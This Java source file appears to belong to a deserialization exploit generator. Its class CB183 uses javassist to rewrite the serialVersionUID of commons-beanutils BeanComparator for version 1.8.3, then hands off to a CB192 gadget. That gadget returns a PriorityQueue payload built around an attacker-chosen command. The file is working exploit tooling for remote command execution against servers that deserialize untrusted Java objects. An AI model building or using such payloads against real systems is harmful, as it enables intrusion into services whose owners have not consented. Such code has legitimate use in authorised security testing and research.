package org.gadget;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.LoaderClassPath;
import org.gadget.inter.Gadget;

import java.util.PriorityQueue;

public class CB183 implements Gadget{
    @Override
    public Object getObject(String command,String path) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        String clsName = "org.apache.commons.beanutils.BeanComparator";
        CtClass ctClass = classPool.get(clsName);
        CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;",ctClass);
        ctClass.addField(field);
        ctClass.toClass();
        // 释放对象
        ctClass.detach();

        PriorityQueue priorityQueue = (PriorityQueue) new CB192().getObject(command, path);

        return priorityQueue;
    }
}
